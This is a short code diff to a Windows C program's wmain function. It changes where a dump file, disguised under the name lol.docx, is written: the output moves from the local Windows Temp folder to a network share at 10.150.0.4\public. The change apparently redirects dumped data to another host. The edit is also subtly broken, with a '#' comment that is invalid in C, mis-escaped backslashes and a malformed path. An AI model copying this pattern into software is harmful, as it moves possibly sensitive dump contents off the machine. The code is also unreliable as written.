@@ -239,7 +239,8 @@ int wmain(int argc, wchar_t* argv[]) {
 	WCHAR chDmpFile[MAX_PATH] = L"\\??\\";
 	WCHAR chWinPath[MAX_PATH];
 	GetWindowsDirectory(chWinPath, MAX_PATH);
-	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
+	#wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
+	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\10.150.0.4\public");
 	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\lol.docx");
 
 	UNICODE_STRING uFileName;
